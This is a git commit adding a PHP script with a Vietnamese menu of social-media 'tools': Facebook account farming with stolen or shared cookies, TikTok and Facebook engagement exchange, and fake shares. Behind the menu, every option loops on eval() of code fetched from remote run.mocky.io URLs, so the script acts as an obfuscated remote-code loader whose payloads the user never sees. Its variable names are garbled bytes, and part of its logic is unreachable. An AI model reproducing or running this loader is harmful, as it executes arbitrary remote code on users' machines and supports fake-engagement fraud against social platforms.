9db59d3b63489ed3ba02eed83c611ebf356d6387
Bao20985 <120572073+Bao20985@users.noreply.github.com>
2022-12-14 20:07:03 +0700

    Create 1.php

---
+++ 1.php
@@ -0,0 +1,171 @@
+<?php
+/* */error_reporting(0);
+session_start();
+date_default_timezone_set('Asia/Ho_Chi_Minh');
+/***[ Color ]***/
+$P��ج��� = "\x1b[38;5;94m";
+$a蕭h� = "\x1b[1;36m";
+$�קPv7�4 = "\x1b[1;31m";
+$�k�jV2�� = "\x1b[1;32m";
+$�t�D�⻩ = "\x1b[1;33m";
+$j�x��XR� = "\x1b[1;34m";
+$�P�ߠ��� = "\x1b[1;35m";
+$���Ja��u = "\x1b[1;37m";
+/***[ USERAGENT ]***/
+$�B�G���g['useragent'] = 'Mozilla/5.0 (Linux; Android 10; CPH1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
+    $�B�G���g['load'] = 200;
+} else {
+    $�B�G���g['load'] = 0;
+}
+@system("clear");
+echo "\x1b[1;37m╔══════════════════════════════════════════════════╗\r\n\x1b[1;37m║\x1b[1;32m   ____      \x1b[1;37m║ \x1b[1;31mBản Quyền: \x1b[1;30mThành Đạt               \x1b[1;37m║\r\n\x1b[1;37m║\x1b[1;32m  (_  _)     \x1b[1;37m║ \x1b[1;32mYouTube: \x1b[1;36mTOM SOOL                  \x1b[1;37m║\r\n\x1b[1;37m║\x1b[1;32m    )(       \x1b[1;37m║ \x1b[1;36mGitHut: \x1b[1;34mPhamThanhDat               \x1b[1;37m║\r\n\x1b[1;37m║\x1b[1;32m   (__)      \x1b[1;37m║ \x1b[1;35mVersion: \x1b[1;37m1.5                       \x1b[1;37m║\r\n\x1b[1;37m╚══════════════════════════════════════════════════╝\r\n\x1b[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\r\n{$�ה1�v��}" . $�P�ߠ��� . "TOOL TDS TTC VERSION 1.5\r\n{$�ה1�v��}" . $�קPv7�4 . "Youtube:" . $�t�D�⻩ . " TOM SOOL \r\n{$�ה1�v��}" . $�t�D�⻩ . "Admin:" . $�k�jV2�� . " Phạm Thành Đạt\r\n{$�ה1�v��}" . $���Ja��u . "Bây Giờ Là: \x1b[1;36m" . date("H:i:s") . "\n";
+echo "\x1b[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
+echo "\x1b[1;32m╔═════════════════════╗\n";
+echo "\x1b[1;32m║";
+echo "\x1b[1;36m Tool Trao Đổi Sub";
+echo "\x1b[1;32m   ║\n";
+echo "\x1b[1;32m╚═════════════════════╝\n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "1" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool TraoDoiSub Đa Cookie \x1b[1;37m[Đa Luồng] \n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "2" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool TraoDoiSub Đa Cookie \x1b[1;37m[Nhiệm Vụ Cảm Xúc] \n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "3" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool TraoDoiSub Tik Tok \x1b[1;37m[V1] \n";
+echo "\x1b[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
+echo "\x1b[1;32m╔═════════════════════════╗\n";
+echo "\x1b[1;32m║\x1b[1;36m Tool TuongTacCheo TikTok\x1b[1;32m║\n";
+echo "\x1b[1;32m╚═════════════════════════╝\n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "4" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool Tương Tác Chéo Tik Tok \x1b[1;37m[V2] \n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "5" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool Tương Tác Chéo Tik Tok \x1b[1;37m[Proxy] \n";
+echo "\x1b[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
+echo "\x1b[1;32m╔════════════════════════╗\n";
+echo "\x1b[1;32m║\x1b[1;36m Tool Nuôi Nick Facebook\x1b[1;32m║\n";
+echo "\x1b[1;32m╚════════════════════════╝\n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "6" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool Nuôi Nick Facebook Đa Cookie \x1b[1;37m[Vip] \n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "7" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool Hủy Follow Facebook \x1b[1;37m[Login Cookie] \n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "8" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool Get ID Facebook Profile \x1b[1;37m[Link Facebook Lite] \n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "9" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool Share Ảo Bằng Page \x1b[1;37m[Login Token] \n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập " . $�קPv7�4 . "[" . $�t�D�⻩ . "10" . $�קPv7�4 . "]" . $�k�jV2�� . " Tool Decode PHP \x1b[1;37m[Dạn Dễ] \n";
+echo "\x1b[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
+echo $�ה1�v�� . $�k�jV2�� . "Nhập Lựa Chọn: {$�t�D�⻩}";
+$䜷Гr�� = trim(fgets(STDIN));
+echo "\x1b[1;32mMời Bạn \x1b[1;35mVào Tool Thành Đạt";
+sleep(2);
+if ($䜷Гr�� == '1') {
+    while (true) {
+        eval(getlink('https://run.mocky.io/v3/8aa559ab-88d5-4aa4-bf88-aee64db47113'));
+    }
+} else {
+    if ($䜷Гr�� == '2') {
+        while (true) {
+            eval(getlink('https://run.mocky.io/v3/af988879-0a2f-4947-a46a-b91de6f486a6'));
+        }
+    } else {
+        if ($䜷Гr�� == '3') {
+            while (true) {
+                eval(getlink('https://run.mocky.io/v3/48fdaf56-860c-4c72-8778-cfa6a3c3df68'));
+            }
+        } else {
+            if ($䜷Гr�� == '4') {
+                while (true) {
+                    eval(getlink('https://run.mocky.io/v3/dd309721-ce6c-45ac-a24e-657696946590'));
+                }
+            } else {
+                if ($䜷Гr�� == '5') {
+                    while (true) {
+                        eval(getlink('https://run.mocky.io/v3/63f6ae34-7651-45b9-a995-33c25eb1d932'));
+                    }
+                } else {
+                    if ($䜷Гr�� == '6') {
+                        while (true) {
+eval(getlink('https://run.mocky.io/v3/13323a7f-9b5e-44e4-b9f7-bbe97076b114'));
+                        }
+                    } else {
+                        if ($䜷Гr�� == '7') {
+                            while (true) {
+                                eval(getlink('https://run.mocky.io/v3/abb3bd6b-797e-449d-ace8-e056b55c5431'));
+                            }
+                        } else {
+                            if ($䜷Гr�� == '8') {
+                                while (true) {
+                                    eval(getlink('https://run.mocky.io/v3/fca5209a-4d72-423a-9932-fbf5b0e8f91a'));
+                                }
+                            } else {
+                                if ($䜷Гr�� == '9') {
+                                    while (true) {
+                                        eval(getlink('https://run.mocky.io/v3/d7bd15a7-8145-4962-a0e1-7a75c34f27de'));
+                                    }
+                                } else {
+                                    if ($䜷Гr�� == '10') {
+                                        while (true) {
+                                            eval(getlink('https://run.mocky.io/v3/f7c9d2ee-dac7-4bd5-98ce-5e3e6327b889'));
+                                        }
+                                        load(25);
+                                        echo $S��gs�° . $�k�jV2�� . "Bạn Đã Gặp Sự Cố Gì: {$�t�D�⻩}";
+                                        $�pC��2la = trim(fgets(STDIN));
+                                        if ($�pC��2la == '') {
+                                            echo $�קPv7�4 . "Vui Lòng Nhập Nội Dung \n";
+                                            die;
+                                        }
+                                        echo $S��gs�° . $�k�jV2�� . "Sự Cố Xảy Ra \n";
+                                        $ڤؠR��� = trim(fgets(STDIN));
+                                        if ($ڤؠR��� > 9) {
+                                            echo $�קPv7�4 . " Bớt Đùa Bạn.  ";
+                                            die;
+                                        }
+                                        echo $S��gs�° . $�k�jV2�� . "Bạn Đang Sử Dụng Trên Thiết Bị  {$�t�D�⻩}";
+                                        $T��l�0�M = trim(fgets(STDIN));
+                                        $ǋ����� = curl_init('https://tomsool/admin/api/loi.php?msg=' . urlencode($�pC��2la) . '&so=' . urlencode($ڤؠR���) . '&thietbi=' . urlencode($T��l�0�M));
+                                        curl_setopt($ǋ�����, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ǋ�����, CURLOPT_CUSTOMREQUEST, 'GET');
+$Z�zP�ɧ� = array();
+                                        $Z�zP�ɧ�[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
+                                        $Z�zP�ɧ�[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+                                        $Z�zP�ɧ�[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
+                                        curl_setopt($ǋ�����, CURLOPT_HTTPHEADER, $Z�zP�ɧ�);
+                                        $���B�o� = curl_exec($ǋ�����);
+                                        curl_close($ǋ�����);
+                                        echo $a蕭h� . "Báo Cáo Thành Công. \n";
+                                    } else {
+                                        echo $�קPv7�4 . " Nhập Sai Định Dạng \n";
+                                        die;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+function getlink($�ofAkv��)
+{
+    $ǋ����� = curl_init($�ofAkv��);
+    curl_setopt($ǋ�����, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ǋ�����, CURLOPT_CUSTOMREQUEST, 'GET');
+    $Z�zP�ɧ� = array();
+    $Z�zP�ɧ�[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (getcode) Chrome/87.0.4280.88 Safari/537.36';
+    $Z�zP�ɧ�[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+    $Z�zP�ɧ�[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
+    curl_setopt($ǋ�����, CURLOPT_HTTPHEADER, $Z�zP�ɧ�);
+    if (curl_errno($ǋ�����)) {
+        echo "\x1b[1;31m Vui Lòng Kiểm Tra Kết Nối Internet \n";
+        die;
+    } else {
+        if (file_get_contents("https://google.com")) {
+            $h����gJ7 = curl_exec($ǋ�����);
+            curl_close($ǋ�����);
+            return $h����gJ7;
+        } else {
+            echo "\x1b[1;31m Vui Lòng Kiểm Tra Kết Nối VPN \n";
+            die;
+        }
+    }
+}
+function load($M��ə3qU)
+{
+    for ($��Fة�u� = 0; $��Fة�u� <= $M��ə3qU; $��Fة�u�++) {
+        echo "\x1b[1;37m -";
+        usleep($�B�G���g['load']);
+    }
+    echo "\n";
+}
